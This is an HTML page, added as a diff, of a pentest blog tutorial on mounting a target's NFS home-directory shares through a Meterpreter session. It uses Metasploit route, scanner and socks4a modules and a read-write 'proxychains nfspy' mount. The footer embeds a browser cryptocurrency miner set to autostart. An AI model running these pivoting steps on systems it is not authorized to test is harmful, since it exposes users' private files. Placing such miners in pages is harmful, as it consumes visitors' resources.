@@ -1,0 +1,286 @@
+<!DOCTYPE html>
+<html>
+
+    <head>
+        <title> Mounting NFS shares through Meterpreter with NfSpy &middot;  </title>
+
+        <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+<meta name="generator" content="Hugo 0.41" />
+
+
+<script   src="https://code.jquery.com/jquery-3.1.1.min.js"   integrity="sha256-hVVnYaiADRTO2PzUGmuLJr8BLUSjGIZsDYGmIJLv2b8="   crossorigin="anonymous"></script>
+
+
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
+
+<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
+
+
+<link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" integrity="sha384-wvfXpqpZZVQGK6TAh5PVlGOfQNHSoD2xbE+QkPxCAFlNEevoEH3Sl0sibVcOQVnN" crossorigin="anonymous">
+
+
+<link rel="stylesheet" href="https://malicious.link/css/nix.css">
+
+
+<link href="https://fonts.googleapis.com/css?family=Inconsolata|Open+Sans|Roboto|Montserrat|Concert+One" rel="stylesheet">
+
+
+
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+		  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+		  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+				  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+
+ga('create', 'UA-198967-1', 'auto');
+	  ga('send', 'pageview');
+
+</script>
+
+
+    </head>
+
+    <body>
+        <header>
+<nav class="navbar navbar-default navbar-fixed-top navbar-inverse font-header">
+	<div class="container-fluid">
+		<div class="navbar-header">
+			<button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar-collapse-1" aria-expanded="false">
+				<span class="sr-only">Toggle navigation</span>
+				<span class="icon-bar"></span>
+				<span class="icon-bar"></span>
+				<span class="icon-bar"></span>
+			</button>
+			<a class="navbar-brand" id="green-terminal" href=https://malicious.link/>mubix@malicious.link ~ $</a>
+		</div>
+
+		
+		<div class="collapse navbar-collapse" id="navbar-collapse-1">
+			<ul class="nav navbar-nav navbar-right">
+				<li>
+					<a href="https://malicious.link/">/home/mubix</a>
+				</li>
+
+				
+				
+				<li >
+					<a href="/brandon">~/brandon</a>
+				</li>
+				
+				
+				<li >
+					<a href="/about">~/about</a>
+				</li>
+				
+				
+				<li >
+					<a href="/post">~/posts</a>
+				</li>
+				
+
+			</ul>
+		</div>
+	</div>
+</nav>
+</header>
+
+        <div class="container wrapper">
+            <h1><a href="https://malicious.link/post/2013/2013-03-04-mounting-nfs-shares-through-meterpreter-with-nfspy/">Mounting NFS shares through Meterpreter with NfSpy</a></h1>
+            <span class="post-date">Mar 4, 2013 </span>
+            <div class="post-content">
+                <p>You&rsquo;ve found an NFS share on a pentest, it&rsquo;s sharing out your target&rsquo;s home directories (/home) and some SAN with all of the Windows AD users &ldquo;home&rdquo; directories under /volumes/users/. You only have a meterpreter session though&hellip; enough back story, problem is that Metasploit doesn&rsquo;t really have any auxiliary modules or otherwise to access the things on those shares. Please correct me if I&rsquo;m wrong, but there also aren&rsquo;t any tools for talking to NFS shares over TCP only proxies.</p>
+
+<p>Enter NfSpy: <a href="https://github.com/bonsaiviking/NfSpy">https://github.com/bonsaiviking/NfSpy</a></p>
+
+<p>While it&rsquo;s original intent was aide in bypassing NFS security controls it has the right amount of options to make mounting NFS over Meterpreter possible.</p>
+
+<p>First we setup up our route so that the aux module will go over the meterpreter session:</p>
+
+<pre><code>route add 192.168.1.0 255.255.255.0 1
+</code></pre>
+
+<p>The 1 on the end being the meterpreter session number it&rsquo;s going to be going through. Next up is to find out what exports are available:</p>
+
+<pre><code>msf &gt; use auxiliary/scanner/nfs/nfsmount
+msf auxiliary(nfsmount) &gt; show options
+
+Module options (auxiliary/scanner/nfs/nfsmount):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   RHOSTS                    yes       The target address range or CIDR identifier
+   RPORT    111              yes       The target port
+   THREADS  1                yes       The number of concurrent threads&lt;
+
+msf auxiliary(nfsmount) &gt; set RHOSTS 192.168.1.50
+RHOSTS =&gt; 192.168.1.50
+msf auxiliary(nfsmount) &gt; run
+[+] 192.168.1.50 NFS Export: /home [192.168.1.0/24]
+[+] 192.168.1.50 NFS Export: /volume/users [192.168.1.0/24]
+</code></pre>
+
+<p>Looks like access is restricked by IP range, but luckily the victim is in said range. The final piece of information we need is the TCP port(s) that mountd is listening on. There is a metasploit module that can help use there too:</p>
+
+<pre><code>msf &gt; use auxiliary/scanner/misc/sunrpc_portmapper
+msf auxiliary(sunrpc_portmapper) &gt; show options
+
+Module options (auxiliary/scanner/misc/sunrpc_portmapper):
+
+   Name     Current Setting  Required  Description&lt;
+   ----     ---------------  --------  -----------
+   RHOSTS                    yes       The target address range or CIDR identifier
+   RPORT    111              yes       The target port
+   THREADS  1                yes       The number of concurrent threads
+
+msf auxiliary(sunrpc_portmapper) &gt; set RHOSTS 192.168.1.50
+RHOSTS =&gt; 192.168.1.50
+msf auxiliary(sunrpc_portmapper) &gt; run
+
+[+] 192.168.1.50 - Programs available
+        rpcbind - 111/tcp
+        rpcbind - 111/udp
+        status - 46797/udp
+        status - 55731/tcp
+        nfs - 2049/tcp
+        nfs_acl - 2049/tcp
+        nfs - 2049/udp
+        nfs_acl - 2049/udp
+        nlockmgr - 54167/udp
+        nlockmgr - 38216/tcp
+        mountd - 52569/udp&lt;
+        mountd - 37719/tcp
+        mountd - 39099/udp
+        mountd - 55763/tcp
+        mountd - 37808/udp
+        mountd - 54457/tcp
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+</code></pre>
+
+<p>Cool, so lets target /home first with the mountd tcp port of 37719. Keeping our route where it is we set up Metasploit&rsquo;s socks proxy:</p>
+
+<pre><code>msf &gt; use auxiliary/server/socks4a
+msf auxiliary(socks4a) &gt; show options
+
+Module options (auxiliary/server/socks4a):
+  Name     Current Setting  Required  Description
+  ----     ---------------  --------  -----------
+  SRVHOST  0.0.0.0          yes       The address to listen on
+  SRVPORT  1080             yes       The port to listen on.
+
+msf auxiliary(socks4a) &gt; set SRVPORT 9050
+SRVPORT =&gt; 9050
+msf auxiliary(socks4a) &gt; set SRVHOST 127.0.0.1
+SRVHOST =&gt; 127.0.0.1
+msf auxiliary(socks4a) &gt; run
+[*] Auxiliary module execution completed
+[*] Starting the socks4a proxy server
+</code></pre>
+
+<p>I chose 9050 as my SRVPORT since I have proxychains already set up for that port (ala tor) and I highly recommend setting the SRVHOST to 127.0.0.1, unless you either firewall that port off from the Internet or don&rsquo;t mind having the Anons of the world surf through your meterpreter session into your clients.</p>
+
+<p>Next up it actually using nfspy (create or prep a directory so you can mount it first):</p>
+
+<pre><code>proxychains nfspy -d -o server=192.168.1.50:/home,nfsport=2049/tcp,mountport=37719/tcp,rw /root/nfspy/mount
+ProxyChains-3.1 (http://proxychains.sf.net)
+FUSE library version: 2.8.6
+nullpath_ok: 0
+unique: 1, opcode: INIT (26), nodeid: 0, insize: 56
+INIT: 7.16
+flags=0x0000007b
+max_readahead=0x00020000
+|S-chain|-&lt;&gt;-127.0.0.1:9050-&lt;&gt;&lt;&gt;-192.168.1.50:37719-&lt;&gt;&lt;&gt;-OK
+|S-chain|-&lt;&gt;-127.0.0.1:9050-&lt;&gt;&lt;&gt;-192.168.1.50:2049-&lt;&gt;&lt;&gt;-OK
+  INIT: 7.12
+  flags=0x00000011
+  max_readahead=0x00020000
+  max_write=0x00020000
+  unique: 1, success, outsize: 40
+</code></pre>
+
+<p><code>proxychains nfspy -d -o server=192.168.1.50:/home,nfsport=2049/tcp,mountport=37719/tcp,rw /root/nfspy/mount</code></p>
+
+<p>Lets break that command down. Proxychains will wrap nfspy so that it goes through our Metasploit Socks4a proxy. The -d tells NfSpy to stay in the foreground, and -o for options. Server is our target IP, only use a hostname if your attacker box can resolve it to the right IP. The export we found with the Metasploit module is up next, and the default NFS port of 2049. The mountport option is from the port mapper Metasploit module. Both of these port options be sure you specify the /tcp or you&rsquo;ll just be waiting as there isn&rsquo;t really a time out and Proxychains doesn&rsquo;t show UDP attempts. RW for read-write and finally the location to mount to.</p>
+
+<p>If you see that second proxychains request for port 2049 it is usually a good indicator that it worked, if not you have probably run into anything from a permissions issue to a local mount problem. NfSpy uses fuse which can be really silent when problems arrise or give errors that tell you nothing meaningful. Thats why I&rsquo;m using the -d option that keeps nfspy in the foreground, just so I can detect any issues. Lets see if that worked:</p>
+
+<pre><code>ls /root/nfspy/mount
+user1
+user2
+user3
+user4
+</code></pre>
+
+<p>Remember, big directories might take a while to navigate being tunneled like this. Here is the output from the ls on the nfspy side:</p>
+
+<pre><code>unique: 166, opcode: OPENDIR (27), nodeid: 34, insize: 48
+   unique: 166, success, outsize: 32
+unique: 167, opcode: READDIR (28), nodeid: 34, insize: 80
+readdir[0] from 0
+   unique: 167, success, outsize: 208
+unique: 168, opcode: LOOKUP (1), nodeid: 34, insize: 46
+LOOKUP /home/user3
+getattr /home/user3
+   NODEID: 40
+   unique: 168, success, outsize: 144
+unique: 169, opcode: LOOKUP (1), nodeid: 34, insize: 46
+LOOKUP /home/user1
+getattr /home/user1
+   NODEID: 41
+   unique: 169, success, outsize: 144
+unique: 170, opcode: LOOKUP (1), nodeid: 34, insize: 46
+LOOKUP /home/user4
+getattr /home/user4
+   NODEID: 42
+   unique: 170, success, outsize: 144
+unique: 171, opcode: LOOKUP (1), nodeid: 34, insize: 46
+LOOKUP /home/user2
+getattr /home/user2
+   NODEID: 43
+   unique: 171, success, outsize: 144
+</code></pre>
+
+<p>Thats it. You can mount read-write (rw) or read-only (ro) depending on what you want to do and how quiet you want to be.</p>
+
+<p>Last note, you can&rsquo;t just CTRL-C an nfspy mount, you need to use <code>fusermount -u /root/nfspy/mount</code> to kill it. It&rsquo;s another fuse issue. If anyone has a better way to do this I&rsquo;m all ears.</p>
+
+            </div>
+            
+            <div class="post-comments">
+                
+            </div>
+            
+            <div class="push"></div>
+        </div>
+        <footer class="footer text-center">
+<p>
+	<center>
+	<b>If you wish to support this blog, please consider clicking start for a little bit. Thanks!</b>
+	<br />
+	<script src="https://authedmine.com/lib/simple-ui.min.js" async></script>
+	<div class="coinhive-miner"
+	style="width: 800px; height: 80px"
+	data-key="Fq2psjl0HfUkdM4LuKrCulHymNpmFuXb"
+	data-whitelabel="true"
+	data-text="#000000"
+	data-background="#F5F5F5"
+	data-user="blog"
+	data-autostart="true"
+	>
+	<em>Loading...</em>
+	</div>
+	</center>
+</p>
+<p>Copyright &copy; 2018 Malicious.Link -
+<span class="credit">
+	Powered by
+	<a target="_blank" href="https://gohugo.io">Hugo</a>
+	and
+	<a target="_blank" href="https://github.com/LordMathis/hugo-theme-nix/">Nix</a> theme.
+</span>
+</p>
+
+</footer>
+
+    </body>
